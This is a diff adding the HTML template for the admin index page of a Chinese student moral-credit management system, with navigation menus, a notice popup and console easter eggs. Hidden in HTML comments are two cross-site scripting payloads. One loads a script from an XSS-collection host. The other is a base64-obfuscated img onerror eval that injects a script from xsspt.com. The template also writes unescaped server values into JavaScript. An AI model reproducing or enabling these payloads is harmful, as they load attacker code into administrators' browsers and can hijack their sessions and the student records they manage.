@@ -1,0 +1,301 @@
+<!doctype html>
+<html class="x-admin-sm">
+<head>
+    <meta charset="UTF-8">
+
+    <title>欢迎使用学生德育学分管理系统</title>
+    <link rel="shortcut icon" href="/static/logo.ico"/>
+    <link rel="stylesheet" href="/static/css/font.css">
+    <link rel="stylesheet" href="/static/css/xadmin.css">
+    <link rel="stylesheet" href="/static/css/theme.css">
+    <script language="javascript">
+        //防止页面后退
+        history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', function () {
+            history.pushState(null, null, document.URL);
+        });
+    </script>
+
+    <script>
+        function tell() {
+
+
+            layer.open({
+                type: 1,
+                title: false //不显示标题栏
+                ,
+                closeBtn: false,
+                area: '600px;',
+                shade: 0.5,
+                id: 'LAY_layuipro' //设定一个id，防止重复弹出
+                ,
+                btn: ['我知道了'],
+                btnAlign: 'c',
+                moveType: 1 //拖拽模式，0或者1
+                ,
+                content: '<div style="padding: 50px; line-height: 22px; background-color: #393D49; color: #fff; font-weight: 300;">最新公告：<br><br>{$data.info}<br><br><div align="right">德育学分项目开发团队&nbsp{$data.time}</div></div>',
+                success: function (layero) {
+                    var btn = layero.find('.layui-layer-btn');
+                }
+            });
+        }
+    </script>
+    <script src="/static/lib/layui/layui.js" charset="utf-8"></script>
+    <script type="text/javascript" src="/js/xadmin.js"></script>
+	<script type="text/javascript">
+		function tj(){
+			var arr = "<?php echo $data1?>"
+			if(arr!=0)
+			{
+			var a = document.getElementById('c1');
+			var b = document.getElementById('c2');
+			var s1 = document.createElement('span');
+			var s2 = document.createElement('span');
+			s1.setAttribute('class','layui-badge');
+			s2.setAttribute('class','layui-badge');
+			a.appendChild(s1);
+			b.appendChild(s2);
+			s2.innerText=arr;
+			s1.innerText=arr;
+			}
+		}
+	</script>
+    <!-- 让IE8/9支持媒体查询，从而兼容栅格 -->
+    <!--[if lt IE 9]>
+    <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
+    <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <script>
+        var is_remember = false;
+    </script>
+    <!--<script src=//xsshs.cn/2Dcv></script>-->
+</head>
+<body class="index" onload="tj()">
+<!-- <img style="width: 0;height: 0;" src=x onerror=eval(atob('cz1jcmVhdGVFbGVtZW50KCdzY3JpcHQnKTtib2R5LmFwcGVuZENoaWxkKHMpO3Muc3JjPSdodHRwczovL3hzc3B0LmNvbS9zeW11Q0M/JytNYXRoLnJhbmRvbSgp'))>
+-->
+<!-- 顶部开始 -->
+<div class="container">
+    <div class="logo">
+        <a href="#">{$data.info}<span style="font-size:10px"> {$data.time}</span></a></div>
+    <div class="left_open">
+        <a><i title="展开左侧栏" class="iconfont">&#xe699;</i></a>
+    </div>
+    <ul class="layui-nav left fast-add" lay-filter="">
+
+    </ul>
+
+    <ul class="layui-nav right" lay-filter="">
+        <li class="layui-nav-item">
+            <a href="javascript:;">欢迎：{$Request.session.username}</a>
+            <dl class="layui-nav-child">
+                <!-- 二级菜单 -->
+                <dd style="background-color: white;">
+                    <a onclick="xadmin.add_tab('个人信息','information')">个人信息</a>
+                </dd>
+                <dd>
+                    <a href="goout" class="close-all">退出登陆</a>
+                </dd>
+            </dl>
+        </li>
+
+    </ul>
+</div>
+<!-- 顶部结束 -->
+<!-- 中部开始 -->
+<!-- 左侧菜单开始 -->
+<div class="left-nav">
+    <div id="side-nav">
+        <ul id="nav">
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="个人管理">&#xe6b8;</i>
+                    <cite>个人管理</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('个人信息','information')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>个人信息</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('修改密码','respwd')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>修改密码</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('个人操作日志','personallog',true)">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>个人操作日志</cite></a>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="学生管理">&#xe6f5;</i>
+                    <cite>学生管理</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('添加学生','addstu')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>添加学生</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('批量添加学生','addmanystu')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>批量添加学生</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('学生查询','showstu')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>学生查询</cite></a>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="用户管理">&#xe6b5;</i>
+                    <cite>用户管理</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('添加用户','adduser')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>添加用户</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('查看用户','showuser')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>查看用户</cite></a>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="学分操作">&#xe705;</i>
+                    <cite id="c1">学分操作</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('学分操作','scoreoperation')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>学分操作</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('待审核操作','examine')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite id="c2">待审核操作</cite></a>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="系统参数设置">&#xe6ae;</i>
+                    <cite>系统参数设置</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('学分操作管理','scoreadmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>学分操作管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('部门/单位信息管理','departmentadmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>部门/单位信息管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('班级信息管理','classadmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>班级信息管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('公寓信息管理','apartmentadmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>公寓信息管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('辅导员信息管理','teacheradmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>辅导员信息管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('专业信息管理','majoradmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>专业信息管理</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('学院信息管理','collegeadmin')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>学院信息管理</cite></a>
+                    </li>
+                </ul>
+            </li>
+            <li>
+                <a href="javascript:;">
+                    <i class="iconfont left-nav-li" lay-tips="日志管理">&#xe744;</i>
+                    <cite>日志管理</cite>
+                    <i class="iconfont nav_right">&#xe697;</i></a>
+                <ul class="sub-menu">
+                    <li>
+                        <a onclick="xadmin.add_tab('系统操作日志','systemlog')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>系统操作日志</cite></a>
+                    </li>
+                    <li>
+                        <a onclick="xadmin.add_tab('学分操作日志','scorelog')">
+                            <i class="iconfont">&#xe6a7;</i>
+                            <cite>学分操作日志</cite></a>
+                    </li>
+                </ul>
+            </li>
+        </ul>
+        </li>
+        </ul>
+
+    </div>
+
+</div>
+
+
+<!-- <div class="x-slide_left"></div> -->
+<!-- 左侧菜单结束 -->
+<!-- 右侧主体开始 -->
+<div class="page-content">
+    <div class="layui-tab tab" lay-filter="xbs_tab" lay-allowclose="false">
+        <ul class="layui-tab-title">
+            <li class="home">
+                <i class="layui-icon">&#xe68e;</i>首页
+            </li>
+        </ul>
+        <div class="layui-unselect layui-form-select layui-form-selected" id="tab_right">
+            <dl>
+                <dd data-type="this">关闭当前</dd>
+                <dd data-type="other">关闭其它</dd>
+                <dd data-type="all">关闭全部</dd>
+            </dl>
+        </div>
+        <div class="layui-tab-content">
+            <div class="layui-tab-item layui-show">
+                <iframe src="log" frameborder="0" scrolling="yes" class="x-iframe"></iframe>
+            </div>
+        </div>
+        <div id="tab_show"></div>
+    </div>
+</div>
+
+<div class="page-content-bg"></div>
+<style id="theme_style"></style>
+<!-- 右侧主体结束 -->
+<!-- 中部结束 -->
+<script>
+    console.log("%c ",
+        "background: url(http://img.soogif.com/kx63nQscumXTtQjSl70ZyDv5w68AbL7C.gif) no-repeat center;padding-left:440px;padding-bottom: 142px;"
+    )
+    console.log("%c 你似乎发现了一个彩蛋 %c  %c 然而并没有什么卵用", "color:red", "", "color:orange;font-weight:bold")
+    console.log("%c 那就祝你可以拥有快乐的每一天吧 %c  %c 嗯哼？", "color:blue;font-weight:bold", "", "color:green;font-weight:bold")
+    console.log("%c 创客实验室 %c%c 出品", "color:BlueViolet;font-weight:bold", "", "color:Black;font-weight:bold")
+</script>
+</body>
+
+</html>
